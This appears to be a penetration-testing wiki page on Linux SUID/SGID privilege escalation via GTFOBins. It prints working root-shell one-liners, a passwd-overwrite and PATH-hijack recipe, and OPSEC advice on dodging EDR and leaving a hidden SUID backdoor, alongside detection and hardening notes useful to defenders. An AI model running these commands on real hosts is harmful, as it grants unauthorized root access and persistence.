---
title: Linux SUID/SGID and GTFOBins methodology
slug: linux-suid-sgid-gtfobins
---

> **TL;DR:** Any executable with the setuid bit and a uid-0 owner runs as root regardless of who invoked it; if the binary can read files, write files, exec a shell, or relay an argument to a sub-process, it's a one-shot privesc. GTFOBins is the canonical catalogue — the methodology is enumerate → match → exploit → cleanup.

## What it is
Linux file permissions include the setuid (`s` in the user-execute slot, mode 04000) and setgid (mode 02000) bits. When the kernel `exec()`s a setuid binary owned by root, the resulting process runs with effective UID 0 even though the real UID is the unprivileged caller. The binary inherits the caller's environment minus a small dynamic-loader sanitisation pass — but most argument handling, file I/O, and sub-process behaviour is preserved. If the binary exposes any primitive that touches a privileged resource (read `/etc/shadow`, write `/etc/passwd`, exec `/bin/sh`, append to a log read by root cron), the caller inherits root power for that operation.

## Preconditions / where it applies
- Local shell as an unprivileged user.
- A SUID binary owned by root (`-rwsr-xr-x root root`) that GTFOBins lists under `suid`, or a custom binary that calls `system()`, `execve()`, or `popen()` on a controllable string.
- For SGID variants: the binary's effective GID grants access to a target file or device (e.g., `disk`, `shadow`, `docker` group).

## Tradecraft
**Step 1 — Enumerate.** Two parallel searches:

```bash
find / -perm -4000 -type f 2>/dev/null              # SUID
find / -perm -2000 -type f 2>/dev/null              # SGID
find / -perm -4000 -uid 0 2>/dev/null -printf '%p %u\n'
```

`linpeas.sh` automates plus correlates against its built-in GTFOBins list. `pspy` running in parallel catches root cron jobs that may be the actual privileged target.

**Step 2 — Match against GTFOBins.** Visit `gtfobins.github.io/#+suid` and grep the discovered binaries. Useful patterns from the catalogue:

```bash
# `find` — direct shell
find . -exec /bin/sh -p \; -quit

# `vim` / `nano` — write `/etc/passwd` or spawn shell
vim -c ':!/bin/sh -p'

# `tar` — `--checkpoint-action=exec`
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# `cp` — overwrite `/etc/passwd` with attacker-crafted entry
echo 'r00t::0:0::/root:/bin/bash' >> /tmp/p && cp -f /tmp/p /etc/passwd

# `awk` — `system()`
awk 'BEGIN {system("/bin/sh -p")}'
```

The `-p` flag on `sh`/`bash` preserves effective UID — without it, modern bash drops privileges immediately.

**Step 3 — Bash-drop sidestep.** When the SUID program ultimately spawns `/bin/sh`, dropping privileges defeats you. Use one of:
- `bash -p` (literal `-p` arg makes bash retain euid).
- `python -c 'import os;os.setuid(0);os.system("/bin/bash")'` from a SUID Python.
- A statically-linked `busybox` SUID binary — `busybox sh` does not drop.
- `cp /bin/bash /tmp/r && chmod +s /tmp/r` only works if you already had root once.

**Step 4 — Custom-binary review.** Strings the binary; look for `system(`, `popen(`, `execlp(` calls with attacker-controllable args. PATH-hijack the unqualified command:

```bash
strings /usr/local/bin/backup | grep -E 'system|popen|execl'
# if backup calls "tar ..." via system():
echo 'cp /bin/bash /tmp/x;chmod +s /tmp/x' > /tmp/tar
chmod +x /tmp/tar; PATH=/tmp:$PATH /usr/local/bin/backup
```

**Step 5 — SGID specifics.** SGID `shadow` lets you read `/etc/shadow` → offline crack. SGID `disk` lets you read raw devices → carve files. SGID `docker` is effectively root (mount host root inside a container).

## Detection and defence
- `auditd` rule on `execve` with `arch=b64 -F euid=0 -F auid!=0` flags every SUID invocation. Whitelist legitimate ones.
- Falco rule `Run shell untrusted` plus `Setuid or Setgid bit set via chmod`.
- Defence: mount `/home`, `/tmp`, and removable media with `nosuid`. Replace SUID with `setcap` only for the specific capability needed (`cap_net_raw+ep` for ping, not full root).
- Inventory SUID quarterly: `find / -perm -4000 -newer /var/log/lastlog` catches new SUIDs since last audit.
- For custom binaries: `pkexec`-style privilege boundaries via polkit, or `sudo` with tight `Cmnd_Alias`.

## OPSEC pitfalls
- Many EDRs (Sandfly, Wazuh) alert on `unshare`, `nsenter`, or `setuid()` calls from non-root parents — write the post-ex actions inline, don't pop a shell to a callback.
- `last`, `wtmp`, and `btmp` log shell sessions; the SUID binary itself often logs via PAM.
- Modifying `/etc/passwd` is loud — prefer a private SUID drop (`cp /bin/bash /tmp/.r && chmod 4755 /tmp/.r`) for future re-entry without re-running the primitive.

## References
- [GTFOBins](https://gtfobins.github.io/) — canonical catalogue, filter by `#+suid` or `#+sudo`
- [HackTricks — Linux SUID](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid) — practitioner walkthrough
- [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) — enumeration with built-in GTFOBins correlation
- [man capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) — replacement model for SUID

See also: [[sudo-misconfig-exploitation]], [[linux-capabilities-abuse]], [[polkit-pkexec-privesc]], [[ld-preload-and-loaders]]
